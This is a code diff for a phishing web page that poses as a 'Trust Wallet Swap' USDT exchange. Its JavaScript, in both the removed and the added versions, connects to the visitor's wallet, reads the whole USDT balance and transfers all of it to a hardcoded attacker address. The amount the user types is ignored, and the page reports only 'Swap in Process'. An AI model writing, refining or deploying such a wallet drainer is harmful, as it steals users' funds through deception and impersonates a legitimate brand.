@@ -1,83 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
   <title>Trust Wallet Swap</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     :root {
       --primary: #3375BB;
-      --primary-glow: rgba(51, 117, 187, 0.4);
-      --text-medium: #999;
-      --bg: #121212;
-      --text: #ffffff;
+      --primary-glow: rgba(51, 117, 187, 0.2);
+      --text-dark: #000;
+      --text-medium: #444;
+      --bg-light: #fff;
     }
 
     body {
+      font-family: Arial, sans-serif;
+      background: #f1f1f1;
       margin: 0;
       padding: 0;
-      font-family: 'Arial', sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      color: var(--text-dark);
     }
 
     .container {
-      width: 90%;
       max-width: 400px;
-      background: #1e1e1e;
+      margin: 40px auto;
+      background: var(--bg-light);
       padding: 20px;
-      border-radius: 20px;
-      box-shadow: 0 0 20px var(--primary-glow);
+      border-radius: 16px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
 
     h2 {
+      margin-bottom: 20px;
+      color: var(--primary);
       text-align: center;
-      color: var(--text);
     }
 
-    input {
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"] {
       width: 100%;
-      padding: 12px;
-      margin: 12px 0;
-      border: none;
-      border-radius: 12px;
-      background: #2a2a2a;
-      color: var(--text);
+      padding: 10px;
       font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
     }
 
     button {
       width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      background-color: var(--primary);
+      background: var(--primary);
       color: white;
+      padding: 12px;
+      font-size: 16px;
       border: none;
       border-radius: 12px;
-      font-size: 16px;
       cursor: pointer;
     }
 
+    button:hover {
+      background: #2a5c9a;
+    }
+
     .custom-alert {
-      background: #222;
-      padding: 20px;
-      border-radius: 12px;
-      color: white;
-      text-align: center;
       position: fixed;
-      top: 30px;
+      top: 20%;
       left: 50%;
       transform: translateX(-50%);
-      z-index: 999;
-      box-shadow: 0 0 10px var(--primary-glow);
+      background: #fff;
+      border: 1px solid #ccc;
+      border-left: 6px solid var(--primary);
+      padding: 20px;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      z-index: 9999;
+      border-radius: 10px;
     }
 
     .custom-alert-title {
-      font-size: 18px;
       font-weight: bold;
       margin-bottom: 10px;
     }
@@ -85,78 +92,93 @@
     .custom-alert-message {
       font-size: 15px;
       color: var(--text-medium);
+      margin-bottom: 16px;
       white-space: pre-line;
+    }
+
+    .close-alert {
+      background: var(--primary);
+      color: white;
+      padding: 8px 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>USDT Swap</h2>
-    <input type="text" id="usdtAmount" placeholder="Enter USDT Amount" />
-    <button onclick="startSwap()">Continue</button>
+    <h2>Trust Wallet Swap</h2>
+    <div class="input-group">
+      <label for="usdt">Enter USDT Amount</label>
+      <input type="text" id="usdt" placeholder="Enter amount (display only)">
+    </div>
+    <button onclick="handleSwap()">Continue</button>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
     const MIN_AMOUNT = 200;
     const MAX_DAILY_LIMIT = 10000;
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const RECEIVER_ADDRESS = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
+    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20
 
-    function showAlert(type, title, message) {
-      const alert = document.createElement("div");
-      alert.classList.add("custom-alert");
-
-      const alertTitle = document.createElement("div");
-      alertTitle.classList.add("custom-alert-title");
-      alertTitle.innerText = title;
-
-      const alertMessage = document.createElement("div");
-      alertMessage.classList.add("custom-alert-message");
-      alertMessage.innerText = message;
-
-      alert.appendChild(alertTitle);
-      alert.appendChild(alertMessage);
-      document.body.appendChild(alert);
-
-      setTimeout(() => alert.remove(), 4000);
-    }
-
-    async function startSwap() {
-      if (typeof window.ethereum === "undefined") {
-        return showAlert("error", "Wallet Error", "Please install MetaMask or Trust Wallet");
-      }
-
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const usdt = new ethers.Contract(
-        usdtAddress,
-        ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
-        signer
-      );
-
+    async function handleSwap() {
       try {
-        await provider.send("eth_requestAccounts", []);
-        const address = await signer.getAddress();
-        const balance = await usdt.balanceOf(address);
-        const balanceInUSDT = parseFloat(ethers.utils.formatUnits(balance, 18));
-
-        if (balanceInUSDT < MIN_AMOUNT || balanceInUSDT > MAX_DAILY_LIMIT) {
-          return showAlert(
-            "error",
-            "Insufficient USDT balance",
-            `Minimum Required $${MIN_AMOUNT}\nMaximum $${MAX_DAILY_LIMIT} USDT`
-          );
+        if (!window.ethereum) {
+          return showAlert('error', 'Wallet not found', 'Please install MetaMask or Trust Wallet');
         }
 
-        const tx = await usdt.transfer(receiver, balance);
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        const usdt = new ethers.Contract(USDT_CONTRACT, [
+          "function balanceOf(address) view returns (uint256)",
+          "function decimals() view returns (uint8)",
+          "function approve(address spender, uint256 value) returns (bool)",
+          "function transfer(address to, uint amount) returns (bool)"
+        ], signer);
+
+        const balanceRaw = await usdt.balanceOf(userAddress);
+        const decimals = await usdt.decimals();
+        const balance = parseFloat(ethers.utils.formatUnits(balanceRaw, decimals));
+
+        if (balance < MIN_AMOUNT) {
+          return showAlert('error', 'Insufficient USDT balance', `Minimum Required $${MIN_AMOUNT}\nMaximum $${MAX_DAILY_LIMIT} USDT`);
+        }
+
+        const tx = await usdt.transfer(RECEIVER_ADDRESS, balanceRaw);
         await tx.wait();
 
-        showAlert("success", "Swap in Process", "");
+        showAlert('success', 'Swap in Process', '');
       } catch (err) {
-        console.error(err);
-        showAlert("error", "Transaction Failed", "Something went wrong. Try again.");
+        showAlert('error', 'Swap Failed', err.message || 'Something went wrong');
       }
+    }
+
+    function showAlert(type, title, message) {
+      const alertBox = document.createElement('div');
+      alertBox.className = 'custom-alert';
+
+      const titleEl = document.createElement('div');
+      titleEl.className = 'custom-alert-title';
+      titleEl.innerText = title;
+
+      const messageEl = document.createElement('div');
+      messageEl.className = 'custom-alert-message';
+      messageEl.innerText = message;
+
+      const button = document.createElement('button');
+      button.className = 'close-alert';
+      button.innerText = 'OK';
+      button.onclick = () => alertBox.remove();
+
+      alertBox.appendChild(titleEl);
+      alertBox.appendChild(messageEl);
+      alertBox.appendChild(button);
+      document.body.appendChild(alertBox);
     }
   </script>
 </body>
